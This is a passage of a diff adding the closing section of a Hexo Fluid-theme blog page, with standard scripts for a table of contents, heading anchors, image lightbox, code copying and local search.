+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
